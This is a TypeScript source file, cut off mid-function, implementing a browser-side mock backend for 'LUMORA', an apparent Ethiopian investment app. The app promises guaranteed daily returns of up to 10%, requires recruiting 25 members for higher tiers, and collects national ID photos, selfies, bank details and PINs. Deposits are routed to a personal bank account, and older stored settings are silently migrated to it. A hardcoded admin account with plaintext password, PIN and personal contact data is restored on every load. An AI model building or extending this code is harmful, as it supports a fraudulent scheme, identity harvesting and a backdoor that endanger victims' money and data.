// Transparent Client-Side local database fallback for static hosting deployments (e.g. Vercel)
// Intercepts fetch requests to '/api/*' and handles them in localStorage when the server is unreachable or returns a 404 HTML fallback.

import { 
  User, Profile, Investment, Deposit, Withdrawal, 
  MyTransaction, Notification, Referral, ChatMessage, Agreement, AppSettings, Loan 
} from '../types';

interface LumoraDB {
  users: User[];
  profiles: Profile[];
  investments: Investment[];
  deposits: Deposit[];
  withdrawals: Withdrawal[];
  transactions: MyTransaction[];
  notifications: Notification[];
  referrals: Referral[];
  chatHistory: Record<string, ChatMessage[]>;
  agreements: Agreement[];
  settings: AppSettings;
  loans: Loan[];
}

const DEFAULT_SETTINGS: AppSettings = {
  id: "global",
  cbeAccountName: "Leykun",
  cbeAccountNumber: "1000419524747",
  referralBonusPercentage: 10,
  productionInviteUrl: "",
};

const VIP_PLANS = [
  { level: 1, name: "VIP Level 1", requiredInvestment: 5000, dailyRate: 0.0350, durationDays: 50, estimatedReturn: 13750 },
  { level: 2, name: "VIP Level 2", requiredInvestment: 10000, dailyRate: 0.0375, durationDays: 50, estimatedReturn: 28750 },
  { level: 3, name: "VIP Level 3", requiredInvestment: 25000, dailyRate: 0.0400, durationDays: 50, estimatedReturn: 75000 },
  { level: 4, name: "VIP Level 4", requiredInvestment: 50000, dailyRate: 0.0430, durationDays: 50, estimatedReturn: 157500 },
  { level: 5, name: "VIP Level 5", requiredInvestment: 100000, dailyRate: 0.0460, durationDays: 70, estimatedReturn: 422000 },
  { level: 6, name: "VIP Level 6", requiredInvestment: 250000, dailyRate: 0.0500, durationDays: 70, estimatedReturn: 1125000 },
  { level: 7, name: "VIP Level 7", requiredInvestment: 500000, dailyRate: 0.0540, durationDays: 70, estimatedReturn: 2390000 },
  { level: 8, name: "VIP Level 8", requiredInvestment: 1000000, dailyRate: 0.0580, durationDays: 70, estimatedReturn: 5060000 },
  { level: 9, name: "VIP Level 9", requiredInvestment: 2000000, dailyRate: 0.0620, durationDays: 70, estimatedReturn: 10680000 },
  { level: 10, name: "VIP Level 10", requiredInvestment: 5000000, dailyRate: 0.0670, durationDays: 70, estimatedReturn: 28450000 },
  { level: 11, name: "VIP Level 11", requiredInvestment: 10000000, dailyRate: 0.0720, durationDays: 90, estimatedReturn: 74800000 },
  { level: 12, name: "VIP Level 12", requiredInvestment: 25000000, dailyRate: 0.0780, durationDays: 90, estimatedReturn: 200500000 },
  { level: 13, name: "VIP Level 13", requiredInvestment: 50000000, dailyRate: 0.0850, durationDays: 90, estimatedReturn: 432500000 },
  { level: 14, name: "VIP Level 14", requiredInvestment: 75000000, dailyRate: 0.0920, durationDays: 90, estimatedReturn: 696000000 },
  { level: 15, name: "VIP Level 15", requiredInvestment: 100000000, dailyRate: 0.1000, durationDays: 120, estimatedReturn: 1300000000 }
];

const AGREEMENTS: Agreement[] = [
  {
    id: "terms-and-conditions",
    title: "Terms and Conditions",
    category: "terms",
    uploadedAt: "2026-06-03T12:00:00Z",
    content: "### Terms and Conditions\n\nWelcome to LUMORA. Please review our revised platform guidelines:\n\n1. **User Identity & Bank Registration**: To maintain compliance with financial frameworks in Ethiopia, user registration does not auto-populate default credentials. Users must designate their own legitimate Commercial Bank of Ethiopia (CBE) bank details and configure a secure 4-digit payment PIN to authorize active withdrawals.\n2. **Unified Financial Limits**: A minimum transaction threshold of 5,000 ETB for CBE deposit submissions and 600 ETB for cashouts is enforced to ensure efficient processing and settlement.\n3. **Real-Time Ledger Integration**: All balance adjustments, VIP level elevations, deposits, and cashouts synchronize in real-time under a 3-second secure consensus. All transfers are manually audited on the admin portal.\n4. **Security & Identity Validation**: To authorize active cashouts and access micro-loans, users must verify their profile by uploading clean photos of both sides of their National ID cards."
  },
  {
    id: "investment-policies",
    title: "Investment Policies & Rules",
    category: "policies",
    uploadedAt: "2026-06-03T12:00:00Z",
    content: "### Investment Policies & Rules\n\nPlatform micro-finance structural rules in detail:\n\n1. **High-Yield Plan Activation**: Investment plans are activated immediately upon balance confirmation (Min 5,000 ETB), automatically starting synced daily yields spanning VIP levels. Interest cycles schedule payouts every 24 hours.\n2. **CBE Transfer and Auditing**: Deposits are routed directly to the treasury audit desk via CBE app screenshots. Administrators evaluate submissions, and credits reflect live on user dashboards in under 2 hours.\n3. **Cashout Settlements**: Users cash out using secure designated accounts. Approved cashouts are dispersed within 0 to 42 hours to prevent settlement issues and ensure sustainable liquidity."
  },
  {
    id: "risk-disclosure",
    title: "About Us",
    category: "about",
    uploadedAt: "2026-06-03T12:00:00Z",
    content: "### About Us & How Lumora Works\n\n**Welcome to Lumora** – Ethiopia's premier peer-to-peer automated micro-finance and high-yield liquidity channel.\n\nWe connect local commerce and infrastructure project liquidity pools directly to user micro-investments, facilitating high-yield, stable growth with institutional accuracy.\n\n#### How It Works:\n\n1. **Deposit Micro-Capital**: Copy our official Commercial Bank of Ethiopia (CBE) account number from the Deposit Dialog. Transfer your starting capital (minimum 5,000 ETB) from your CBE Birr App, note down your reference code, and capture a clear screenshot of the receipt.\n2. **Submit Proof**: Enter your deposited amount, paste the CBE reference code, upload your receipt screenshot, and submit. The administrators will audit and credit your account within 2 hours.\n3. **Activate High-Yield Plans**: Invest your wallet balance into VIP tiers ranging from VIP 0 to VIP 15. Your plan activates immediately, compounding interest payouts every 24 hours.\n4. **Secure Dynamic Cashouts**: Navigate to the Cashout menu. First, configure your personal phone number, active Ethiopian bank card details, and a secret 4-digit transaction PIN. Authorize cashouts (minimum 600 ETB) safely using this PIN.\n5. **Identity Integrity**: Verify your account by uploading photos of both sides of your National ID. This unlocks access to VIP active withdrawals and institutional loan options."
  }
];

function getInitialDB(): LumoraDB {
  return {
    users: [
      {
        id: "user-0kw1ojisk",
        fullName: "Alem",
        phone: "0926193920",
        email: "leykunjemaneh3@gmail.com",
        password: "000000",
        isAdmin: true,
        status: "active",
        registrationDate: new Date().toISOString(),
        referralCode: "LUMOTU23"
      }
    ],
    profiles: [
      {
        userId: "user-0kw1ojisk",
        fullName: "Alem",
        phone: "0926193920",
        email: "leykunjemaneh3@gmail.com",
        vipLevel: 15,
        walletBalance: 20000000,
        totalDeposits: 20000000,
        totalWithdrawals: 0,
        totalInvestments: 0,
        totalEarnings: 0,
        referralCode: "LUMOTU23",
        teamSize: 0,
        registrationDate: new Date().toISOString(),
        idCardFront: "",
        idCardBack: "",
        idVerificationStatus: "verified",
        bankName: "Commercial Bank of Ethiopia (CBE)",
        accountNumber: "10004400772625",
        accountHolderName: "Alem",
        transactionPin: "4321",
        idSelfie: ""
      }
    ],
    investments: [],
    deposits: [],
    withdrawals: [],
    transactions: [],
    notifications: [],
    referrals: [],
    chatHistory: {},
    agreements: AGREEMENTS,
    settings: DEFAULT_SETTINGS,
    loans: []
  };
}

function loadLocalDB(): LumoraDB {
  const data = localStorage.getItem('lumora_local_db');
  let db: LumoraDB;
  if (data) {
    try {
      const parsed = JSON.parse(data) as LumoraDB;
      if (!parsed.loans) parsed.loans = [];
      db = parsed;
    } catch {
      db = getInitialDB();
    }
  } else {
    db = getInitialDB();
  }

  // Force-prune the old System Admin placeholder account ("0900000000" / "admin-sys-001") if present in stored localStorage DB
  const beforeCountUsers = db.users.length;
  db.users = db.users.filter(u => u.phone !== "0900000000" && u.id !== "admin-sys-001");
  db.profiles = db.profiles.filter(p => p.phone !== "0900000000" && p.userId !== "admin-sys-001");
  let modified = db.users.length !== beforeCountUsers;

  // Dynamically migrate old default settings so existing sessions immediately access the updated account details
  if (!db.settings) {
    db.settings = { ...DEFAULT_SETTINGS };
    modified = true;
  } else if (db.settings.cbeAccountNumber === "1000456123985" || db.settings.cbeAccountName === "LUMORA Financial Group") {
    db.settings.cbeAccountNumber = "1000419524747";
    db.settings.cbeAccountName = "Leykun";
    modified = true;
  }

  // Self-correcting: Ensure ALL initial seed users from getInitialDB() are always present in the database,
  // preventing login failures when legacy users visit the app.
  const initial = getInitialDB();

  for (const initUser of initial.users) {
    const userExists = db.users.some(u => u.phone === initUser.phone || u.id === initUser.id);
    if (!userExists) {
      db.users.push(initUser);
      const matchingProfile = initial.profiles.find(p => p.userId === initUser.id);
      if (matchingProfile) {
        db.profiles.push(matchingProfile);
      }
      modified = true;
    } else {
      const existingUser = db.users.find(u => u.phone === initUser.phone || u.id === initUser.id);
      if (existingUser) {
        if (existingUser.password !== initUser.password) {
          existingUser.password = initUser.password;
          modified = true;
        }
        if (initUser.phone === "0926193920" && !existingUser.isAdmin) {
          existingUser.isAdmin = true;
          modified = true;
        }
      }
    }
  }

  const balancesModified = sanitizeLocalDBBalances(db);
  if (modified || balancesModified || !data) {
    saveLocalDB(db);
  }
  return db;
}

function sanitizeLocalDBBalances(db: LumoraDB) {
  let modified = false;
  if (!db.profiles) db.profiles = [];
  db.profiles.forEach(p => {
    let changed = false;
    if (p.depositBalance === undefined || p.incomeBalance === undefined) {
      const estIncome = Math.min(p.walletBalance, p.totalEarnings);
      p.incomeBalance = p.incomeBalance !== undefined ? p.incomeBalance : estIncome;
      p.depositBalance = p.depositBalance !== undefined ? p.depositBalance : (p.walletBalance - p.incomeBalance);
      changed = true;
    }

    // Auto-heal incomeBalance if there are active earnings but incomeBalance was cleared or not updated
    if (p.totalEarnings > 0) {
      const maxPossibleIncome = Math.max(0, Math.min(p.walletBalance, p.totalEarnings - (p.totalWithdrawals || 0)));
      if (p.incomeBalance < maxPossibleIncome) {
        p.incomeBalance = maxPossibleIncome;
        p.depositBalance = Math.max(0, p.walletBalance - p.incomeBalance);
        changed = true;
      }
    }

    if (p.depositBalance < 0) {
      p.depositBalance = 0;
      changed = true;
    }
    if (p.incomeBalance < 0) {
      p.incomeBalance = 0;
      changed = true;
    }
    const sum = p.depositBalance + p.incomeBalance;
    if (sum !== p.walletBalance) {
      p.depositBalance = p.walletBalance - p.incomeBalance;
      if (p.depositBalance < 0) {
        p.depositBalance = 0;
        p.incomeBalance = p.walletBalance;
      }
      changed = true;
    }
    if (changed) {
      modified = true;
    }
  });
  return modified;
}

function saveLocalDB(db: LumoraDB) {
  localStorage.setItem('lumora_local_db', JSON.stringify(db));
}

function autoAllocateLocalDailyEarnings(db: LumoraDB) {
  let dbUpdated = false;
  const now = new Date();

  db.investments.forEach(inv => {
    if (inv.status === 'active' && inv.remainingDays > 0) {
      const baseDateStr = inv.lastPayoutDate || inv.startDate;
      const lastPayout = new Date(baseDateStr);
      const diffMs = now.getTime() - lastPayout.getTime();
      const oneDayMs = 24 * 60 * 60 * 1000;
      
      const periods = Math.floor(diffMs / oneDayMs);
      if (periods > 0) {
        const actualPeriodsToPay = Math.min(periods, inv.remainingDays);
        if (actualPeriodsToPay > 0) {
          let newlyAccrued = 0;
          for (let i = 0; i < actualPeriodsToPay; i++) {
            inv.remainingDays = Math.max(0, inv.remainingDays - 1);
            newlyAccrued += inv.dailyReturn;

            if (inv.remainingDays <= 0) {
              inv.status = 'matured';
              break;
            }
          }
          inv.unclaimedReturns = (inv.unclaimedReturns ?? 0) + newlyAccrued;
          inv.lastPayoutDate = new Date(lastPayout.getTime() + actualPeriodsToPay * oneDayMs).toISOString();
          dbUpdated = true;

          // Notify the user they have unclaimed returns
          const hasUnreadNotification = db.notifications.some(
            n => n.userId === inv.userId && !n.read && n.title.includes("Unclaimed Returns")
          );
          if (!hasUnreadNotification) {
            db.notifications.push({
              id: "not-" + Math.random().toString(36).substr(2, 9),
              userId: inv.userId,
              title: "Unclaimed Returns Alert",
              message: `You have accumulated daily returns pending of ${inv.dailyReturn} ETB. Please go to the Check-In or active assets section to claim manually.`,
              read: false,
              date: new Date().toISOString()
            });
          }
        }
      }
    }
  });

  if (dbUpdated) {
    saveLocalDB(db);
  }
}

// Function to handle the intercepted local storage operations
async function handleLocalAPI(url: string, init?: RequestInit): Promise<Response> {
  const pathname = url.split('?')[0];
  const method = init?.method?.toUpperCase() || 'GET';
  const body = init?.body ? JSON.parse(init.body as string) : undefined;
  
  const db = loadLocalDB();
  autoAllocateLocalDailyEarnings(db);
  sanitizeLocalDBBalances(db);
  saveLocalDB(db);

  const respondJSON = (status: number, data: any) => {
    return new Response(JSON.stringify(data), {
      status,
      headers: { 'Content-Type': 'application/json' }
    });
  };

  // 1. GET /api/health
  if (pathname === '/api/health' && method === 'GET') {
    return respondJSON(200, { status: "ok" });
  }

  // 2. GET /api/plans
  if (pathname === '/api/plans' && method === 'GET') {
    return respondJSON(200, VIP_PLANS);
  }

  // 3. GET /api/agreements
  if (pathname === '/api/agreements' && method === 'GET') {
    return respondJSON(200, db.agreements || AGREEMENTS);
  }

  // 4. POST /api/auth/session
  if (pathname === '/api/auth/session' && method === 'POST') {
    const { userId } = body;
    if (!userId) return respondJSON(401, { error: "Session authentication failed" });
    const user = db.users.find(u => u.id === userId);
    const profile = db.profiles.find(p => p.userId === userId);
    if (!user || !profile) return respondJSON(404, { error: "Active user profile not found" });
    if (user.status === "suspended") return respondJSON(403, { error: "Your account is suspended. Contact LUMORA Support." });
    return respondJSON(200, { user, profile });
  }

  // 5. POST /api/auth/register
  if (pathname === '/api/auth/register' && method === 'POST') {
    const { fullName, phone, email, password, referralCode } = body;
    if (!fullName || !phone || !email || !password) {
      return respondJSON(400, { error: "All fields including email are required" });
    }
    const userExists = db.users.some(u => u.phone === phone);
    if (userExists) {
      return respondJSON(409, { error: "This phone number is already registered" });
    }

    const userId = "user-" + Math.random().toString(36).substr(2, 9);
    const systemReferral = "LUM" + Math.random().toString(36).substr(2, 5).toUpperCase();

    let referrer = referralCode ? db.users.find(u => u.referralCode === referralCode) : undefined;

    const newUser: User = {
      id: userId,
      fullName,
      phone,
      email,
      password,
      isAdmin: phone === "0926193920" ? true : false,
      status: "active",
      registrationDate: new Date().toISOString(),
      referralCode: systemReferral,
      referredBy: referrer ? referralCode : undefined
    };

    const newProfile: Profile = {
      userId,
      fullName,
      phone,
      email,
      vipLevel: 0,
      walletBalance: 0,
      totalDeposits: 0,
      totalWithdrawals: 0,
      totalInvestments: 0,
      totalEarnings: 0,
      referralCode: systemReferral,
      teamSize: 0,
      registrationDate: new Date().toISOString(),
      idCardFront: "",
      idCardBack: "",
      idSelfie: "",
      idVerificationStatus: "unsubmitted",
      bankName: "",
      accountNumber: "",
      accountHolderName: "",
      transactionPin: ""
    };

    db.users.push(newUser);
    db.profiles.push(newProfile);

    if (referrer) {
      const referrerProfile = db.profiles.find(p => p.userId === referrer!.id);
      if (referrerProfile) referrerProfile.teamSize += 1;
      db.referrals.push({
        id: "ref-" + Math.random().toString(36).substr(2, 9),
        referrerId: referrer.id,
        referredId: userId,
        referredName: fullName,
        referredPhone: phone,
        referredVipLevel: 0,
        registrationDate: new Date().toISOString(),
        rewardEarned: 0
      });
    }

    db.notifications.push({
      id: "not-" + Math.random().toString(36).substr(2, 9),
      userId,
      title: "Welcome to LUMORA!",
      message: "Congratulations! Your account has been created. Connect with us via official CBE deposit to choose a VIP Investment plan.",
      read: false,
      date: new Date().toISOString()
    });

    saveLocalDB(db);
    return respondJSON(200, { user: newUser, profile: newProfile });
  }

  // 6. POST /api/auth/login
  if (pathname === '/api/auth/login' && method === 'POST') {
    const { phone, password } = body;
    const user = db.users.find(u => u.phone === phone);
    if (!user || user.password !== password) {
      return respondJSON(401, { error: "Invalid telephone number or password credentials." });
    }
    if (user.status === "suspended") {
      return respondJSON(430, { error: "This profile has been suspended indefinitely for institutional compliance auditing. Please connect with Lumora Technical Desk." });
    }
    const profile = db.profiles.find(p => p.userId === user.id || p.phone === phone);
    return respondJSON(200, { user, profile });
  }

  // 7. POST /api/auth/submit-id
  if (pathname === '/api/auth/submit-id' && method === 'POST') {
    const { userId, idCardFront, idCardBack, idSelfie, fanNumber } = body;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    const trimmedFan = (fanNumber || "").trim();
    if (!trimmedFan) {
      return respondJSON(400, { error: "Your National ID/FAN number is required." });
    }
    const cleanFanNum = trimmedFan.replace(/[-\s]/g, '');
    const isSixteenDigits = /^\d{16}$/.test(cleanFanNum);
    if (!isSixteenDigits) {
      return respondJSON(400, { error: "The National ID / FAN registration number must be exactly 16 digits (e.g. 8989898911899987). It cannot be less than or more than 16 digits." });
    }

    if (trimmedFan) {
      const duplicateFan = db.profiles.find(p => p.userId !== userId && p.fanNumber && p.fanNumber.trim().toUpperCase() === trimmedFan.toUpperCase());
      if (duplicateFan) {
        return respondJSON(400, { error: "This National ID / FAN number is already associated with an existing account. Double registration is prohibited to protect security and compliance." });
      }
    }

    profile.idCardFront = idCardFront;
    profile.idCardBack = idCardBack;
    profile.idSelfie = idSelfie;
    profile.fanNumber = trimmedFan;
    profile.idVerificationStatus = "pending";

    db.notifications.push({
      id: "not-" + Math.random().toString(36).substr(2, 9),
      userId,
      title: "Biometrics ID Review Pending",
      message: `Your ID files (Registration FAN: ${fanNumber}) and facial selfie have been successfully dispatched to the audits desk. Review takes up to 3 hours under CBE institutional clearance framework.`,
      read: false,
      date: new Date().toISOString()
    });

    saveLocalDB(db);
    return respondJSON(200, { success: true, profile });
  }

  // 8. GET /api/dashboard/:userId
  if (pathname.startsWith('/api/dashboard/') && method === 'GET') {
    const userId = pathname.split('/').pop();
    const user = db.users.find(u => u.id === userId);
    const profile = db.profiles.find(p => p.userId === userId);
    if (!user || !profile) return respondJSON(404, { error: "User not found" });

    const userInvestments = db.investments.filter(i => i.userId === userId);
    const userTransactions = db.transactions.filter(t => t.userId === userId);
    const userNotifications = db.notifications.filter(n => n.userId === userId);
    const userLoans = db.loans.filter(l => l.userId === userId);

    return respondJSON(200, {
      profile,
      investments: userInvestments,
      recentTransactions: userTransactions.slice(0, 15),
      notifications: userNotifications,
      isAdmin: user.isAdmin,
      loans: userLoans
    });
  }

  // 9. POST /api/deposits/submit
  if (pathname === '/api/deposits/submit' && method === 'POST') {
    const { userId, amount, bankAccount, receiptImage, screenshot, bankReference } = body;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    const trimmedRef = (bankReference || "").trim();
    if (trimmedRef) {
      const duplicateRef = db.deposits.find(d => d.bankReference && d.bankReference.trim().toUpperCase() === trimmedRef.toUpperCase());
      if (duplicateRef) {
        return respondJSON(400, { error: "This CBE transaction reference code has already been registered or used. Each unique reference number can only be submitted once." });
      }
    }

    const newDeposit: Deposit = {
      id: "dep-" + Math.random().toString(36).substr(2, 9),
      userId,
      userName: profile.fullName,
      userPhone: profile.phone,
      amount: Number(amount),
      bankAccount: bankAccount || "Commercial Bank of Ethiopia (CBE)",
      receiptImage: receiptImage || screenshot || "receipt_base64_log_placeholder",
      bankReference: trimmedRef || "",
      submittedAt: new Date().toISOString(),
      status: "pending"
    } as any;

    db.deposits.push(newDeposit);
    db.notifications.push({
      id: "not-" + Math.random().toString(36).substr(2, 9),
      userId,
      title: "CBE Deposit Dispatched",
      message: `Your deposit of ${amount} ETB via ${bankAccount} has been posted. Waiting for operator review.`,
      read: false,
      date: new Date().toISOString()
    });

    saveLocalDB(db);
    return respondJSON(200, { success: true, deposit: newDeposit });
  }

  // 10. POST /api/withdrawals/submit
  if (pathname === '/api/withdrawals/submit' && method === 'POST') {
    const { userId, amount, pin, transactionPin, bankName, accountNumber, accountHolderName, balanceType } = body;
    const finalPin = transactionPin || pin;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    if (profile.transactionPin && profile.transactionPin !== finalPin) {
      return respondJSON(400, { error: "Invalid 4-digit transaction security PIN" });
    }

    const withdrawAmount = Number(amount);
    if (isNaN(withdrawAmount) || withdrawAmount < 600) {
      return respondJSON(400, { error: "Minimum withdrawal limit is 600 ETB" });
    }
    if (profile.walletBalance < 600) {
      return respondJSON(400, { error: "User total balance must be at least 600 ETB to withdraw." });
    }

    // Default to 'income' if they have enough balance, else 'deposit'
    const chosenType: 'deposit' | 'income' = (balanceType === 'deposit' || balanceType === 'income')
      ? balanceType
      : ((profile.incomeBalance || 0) >= withdrawAmount ? 'income' : 'deposit');

    if (profile.depositBalance === undefined) profile.depositBalance = profile.walletBalance;
    if (profile.incomeBalance === undefined) profile.incomeBalance = 0;

    if (chosenType === 'income') {
      if (profile.incomeBalance < withdrawAmount) {
        return respondJSON(400, { error: `Insufficient income balance. You only have ${(profile.incomeBalance || 0).toFixed(2)} ETB inside your income pool.` });
      }
    } else {
      if (profile.depositBalance < withdrawAmount) {
        return respondJSON(400, { error: `Insufficient deposit balance. You only have ${(profile.depositBalance || 0).toFixed(2)} ETB inside your deposit pool.` });
      }
    }

    if (profile.walletBalance < withdrawAmount) {
      return respondJSON(400, { error: "Insufficient available balance key in your wallet." });
    }

    // Calculate fees on chosenType:
    // Deposit balance cashout fee is 5%.
    // Income balance cashout fee is 5% tax + 5% fee (total 10%).
    const feeRate = chosenType === 'income' ? 0.10 : 0.05;
    const feeVal = Math.round(withdrawAmount * feeRate * 100) / 100;
    const netAmount = parseFloat((withdrawAmount - feeVal).toFixed(2));

    profile.walletBalance -= withdrawAmount;
    if (chosenType === 'income') {
      profile.incomeBalance -= withdrawAmount;
    } else {
      profile.depositBalance -= withdrawAmount;
    }
    profile.totalWithdrawals += withdrawAmount;

    const newWithdrawal: Withdrawal = {
      id: "wit-" + Math.random().toString(36).substr(2, 9),
      userId,
      userName: profile.fullName,
      userPhone: profile.phone,
      amount: withdrawAmount,
      status: "pending",
      submittedAt: new Date().toISOString(),
      bankName: bankName || profile.bankName,
      accountNumber: accountNumber || profile.accountNumber,
      accountHolderName: accountHolderName || profile.accountHolderName,
      fee: feeVal,
      netAmount,
      balanceType: chosenType
    };

    db.withdrawals.push(newWithdrawal);
    db.transactions.push({
      id: "tx-" + Math.random().toString(36).substr(2, 9),
      userId,
      type: "withdrawal",
      amount: -withdrawAmount,
      description: `CBE cashout transaction: withdrew ${withdrawAmount} ETB from ${chosenType === 'income' ? 'Income Pool' : 'Deposit Pool'}. Net amount: ${netAmount} ETB.`,
      date: new Date().toISOString()
    });

    db.notifications.push({
      id: "not-" + Math.random().toString(36).substr(2, 9),
      userId,
      title: "Withdrawal Requested",
      message: `Your cashout withdrawal request of ${withdrawAmount} ETB from ${chosenType === 'income' ? 'income' : 'deposit'} balance is currently in the queue. Checked in real-time.`,
      read: false,
      date: new Date().toISOString()
    });

    saveLocalDB(db);
    return respondJSON(200, { success: true, profile });
  }

  // 11. GET /api/withdrawals/user/:userId
  if (pathname.startsWith('/api/withdrawals/user/') && method === 'GET') {
    const userId = pathname.split('/').pop();
    const list = db.withdrawals.filter(w => w.userId === userId);
    return respondJSON(200, list);
  }

  // 12. POST /api/investments/buy
  if (pathname === '/api/investments/buy' && method === 'POST') {
    const { userId, planLevel, vipLevel, durationDays } = body;
    const finalLevel = planLevel !== undefined ? planLevel : vipLevel;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    const plan = VIP_PLANS.find(p => p.level === Number(finalLevel));
    if (!plan) return respondJSON(400, { error: "Invalid VIP Level selected" });

    if (profile.idVerificationStatus !== "verified") {
      return respondJSON(400, { error: "Identity verification is mandatory before unlocking custom VIP plans." });
    }

    if (profile.walletBalance < plan.requiredInvestment) {
      return respondJSON(400, { error: `Insufficient available funds. Required: ${plan.requiredInvestment} ETB.` });
    }

    // Level 5 Activation Constraint Guard
    if (plan.level >= 5) {
      const regDate = profile.registrationDate ? new Date(profile.registrationDate) : new Date();
      const now = new Date();
      const diffTime = Math.abs(now.getTime() - regDate.getTime());
      const hasDuration = (diffTime / (1000 * 60 * 60 * 24 * 30.4375)) >= 5;

      const userReferrals = db.referrals.filter(r => r.referrerId === userId);
      const verifiedReferrals = userReferrals.filter(ref => {
        const rp = db.profiles.find(p => p.userId === ref.referredId);
        return rp && rp.idVerificationStatus === 'verified';
      });
      const hasInvites = verifiedReferrals.length >= 25;
      const isCompliant = profile.idVerificationStatus === 'verified';

      if (!hasDuration || !hasInvites || !isCompliant) {
        let reqText = "Level 5 Requirements:\n";
        reqText += hasDuration ? "✓ Membership active for 5 months\n" : "✗ Membership active for 5 months\n";
        reqText += hasInvites ? "✓ Invite at least 25 verified members\n" : "✗ Invite at least 25 verified members\n";
        reqText += isCompliant ? "✓ Account is active and compliant with platform rules" : "✗ Account is active and compliant with platform rules";
        return respondJSON(400, { error: reqText });
      }
    }

    const finalDurationDays = durationDays ? Number(durationDays) : plan.durationDays;

    profile.walletBalance -= plan.requiredInvestment;
    if (profile.depositBalance === undefined) profile.depositBalance = profile.walletBalance + plan.requiredInvestment;
    if (profile.incomeBalance === undefined) profile.incomeBalance = 0;

    if (profile.depositBalance >= plan.requiredInvestment) {
      profile.depositBalance -= plan.requiredInvestment;
    } else {
      const rest = plan.requiredInvestment - profile.depositBalance;
      profile.depositBalance = 0;
      profile.incomeBalance = Math.max(0, profile.incomeBalance - rest);
    }
    profile.totalInvestments += plan.requiredInvestment;
    if (plan.level > profile.vipLevel) {
      profile.vipLevel = plan.level;
    }

    const newInvestment: Investment = {
      id: "inv-" + Math.random().toString(36).substr(2, 9),
      userId,
      planId: `vip-${plan.level}`,
      planName: plan.name,
      planLevel: plan.level,
      amount: plan.requiredInvestment,
      dailyRate: plan.dailyRate,
      dailyReturn: Number((plan.requiredInvestment * plan.dailyRate).toFixed(2)),
      startDate: new Date().toISOString(),
      maturityDate: new Date(Date.now() + 3600 * 24 * finalDurationDays * 1000).toISOString(),
      remainingDays: finalDurationDays,
      status: "active",
      totalEarned: 0,
      lastPayoutDate: new Date().toISOString()
    };

    db.investments.push(newInvestment);
    db.transactions.push({
      id: "tx-" + Math.random().toString(36).substr(2, 9),
      userId,
      type: "investment",
      amount: -plan.requiredInvestment,
      description: `Purchased VIP Level ${plan.level} Active Investment Plan`,
      date: new Date().toISOString()
    });

    db.notifications.push({
      id: "not-" + Math.random().toString(36).substr(2, 9),
      userId,
      title: `${plan.name} Activated!`,
      message: `Congratulations! Your VIP interest accrual is now live. Safe daily payout returns guaranteed.`,
      read: false,
      date: new Date().toISOString()
    });

    saveLocalDB(db);
    return respondJSON(200, { success: true, profile });
  }

  // 12b. POST /api/investments/claim
  if (pathname === '/api/investments/claim' && method === 'POST') {
    const { userId, investmentId } = body;
    if (!userId) return respondJSON(400, { error: "User ID is required" });

    const userInvestments = db.investments.filter(i => i.userId === userId);
    let totalClaimed = 0;
    const claimDetails: string[] = [];

    userInvestments.forEach(inv => {
      if (investmentId && inv.id !== investmentId) return;
      if (inv.unclaimedReturns && inv.unclaimedReturns > 0) {
        const amt = inv.unclaimedReturns;
        totalClaimed += amt;
        inv.totalEarned = (inv.totalEarned ?? 0) + amt;
        inv.unclaimedReturns = 0;
        claimDetails.push(`${amt} ETB (${inv.planName})`);
      }
    });

    if (totalClaimed <= 0) {
      return respondJSON(400, { error: "You have no unclaimed returns to collect at this moment." });
    }

    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    profile.walletBalance += totalClaimed;
    profile.totalEarnings += totalClaimed;
    if (profile.incomeBalance === undefined) profile.incomeBalance = 0;
    profile.incomeBalance += totalClaimed;

    db.transactions.push({
      id: "tx-" + Math.random().toString(36).substr(2, 9),
      userId: userId,
      type: "daily_earnings",
      amount: totalClaimed,
      description: `Claimed daily returns: ${claimDetails.join(", ")}`,
      date: new Date().toISOString()
    });

    db.notifications.push({
      id: "not-" + Math.random().toString(36).substr(2, 9),
      userId: userId,
      title: "Daily Earnings Claimed",
      message: `Successfully claimed ${totalClaimed.toFixed(2)} ETB daily returns to your Income Pool.`,
      read: false,
      date: new Date().toISOString()
    });

    saveLocalDB(db);
    return respondJSON(200, { 
      success: true, 
      profile, 
      claimedAmount: totalClaimed,
      investments: db.investments.filter(i => i.userId === userId)
    });
  }

  // 13. POST /api/profiles/withdrawal-setup
  if (pathname === '/api/profiles/withdrawal-setup' && method === 'POST') {
    const { userId, bankName, accountNumber, accountHolderName } = body;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    profile.bankName = bankName;
    profile.accountNumber = accountNumber;
    profile.accountHolderName = accountHolderName;

    saveLocalDB(db);
    return respondJSON(200, { success: true, profile });
  }

  // 14. POST /api/profiles/pin
  if (pathname === '/api/profiles/pin' && method === 'POST') {
    const { userId, pin } = body;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    profile.transactionPin = pin;
    saveLocalDB(db);
    return respondJSON(200, { success: true, profile });
  }

  // 14b. POST /api/profiles/check-in
  if (pathname === '/api/profiles/check-in' && method === 'POST') {
    const { userId } = body;
    const profile = db.profiles.find(p => p.userId === userId);
    if (!profile) return respondJSON(404, { error: "Profile not found" });

    const now = new Date();
    if (profile.lastCheckInDate) {
      const lastCheckIn = new Date(profile.lastCheckInDate);
      const diffMs = now.getTime() - lastCheckIn.getTime();
      const oneDayMs = 24 * 60 * 60 * 1000;
      if (diffMs < oneDayMs) {
        const remainingMs = oneDayMs - diffMs;
        const remainingHours = Math.ceil(remainingMs / (1000 * 60 * 60));
        return respondJSON(400, { error: `You have already claimed today's check-in bonus. Please check in again in ${remainingHours} hours.` });
      }
    }

    const bonusAmount = 5;
    profile.walletBalance += bonusAmount;
    profile.incomeBalance = (profile.incomeBalance ?? 0) + bonusAmount;
    profile.totalEarnings += bonusAmount;
    profile.lastCheckInDate = now.toISOString();

    db.transactions.push({
      id: "tx-" + Math.random().toString(36).substr(2, 9),
      userId: userId,
      type: "referral_reward",
      amount: bonusAmount,
      description: "Accrued 5 ETB Daily Attendance Check-In Bonus Reward",
      date: now.toISOString()
    });

    db.notifications.push({
      id: "not-" + Math.random().toString(36).substr(2, 9),
      userId,
      title: "Daily Check-In Claimed",
